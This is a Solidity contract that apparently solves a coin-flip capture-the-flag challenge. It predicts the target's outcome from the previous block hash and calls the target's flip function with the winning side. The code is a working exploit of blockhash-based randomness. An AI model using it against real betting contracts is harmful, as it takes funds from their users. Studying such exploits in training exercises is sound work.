// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SolveCF {

    address _contractAddress; 

    uint256 _lastHash;

    uint256 _factor;


    constructor(address contractAddress, uint256 factor) {
        _contractAddress = contractAddress;
        _factor = factor;
    }


    function setFactor(uint256 factor) external { 
        _factor = factor;
    }


    function setContractAddress(address contractAddress) external { 
        _contractAddress = contractAddress;
    }


    function winCF() external  {
        uint256 blockValue;
        bool side;
        uint256 coinFlip;

        blockValue = uint256(blockhash(block.number - 1));

        if (_lastHash == blockValue) {
            revert();
        }

        _lastHash = blockValue;
        coinFlip = blockValue / _factor;
        side = coinFlip == 1 ? true : false;

        (bool ok, ) = _contractAddress.call(abi.encodeWithSignature("flip(bool)", side));

        require(ok, "Llamada fallida");
    }
}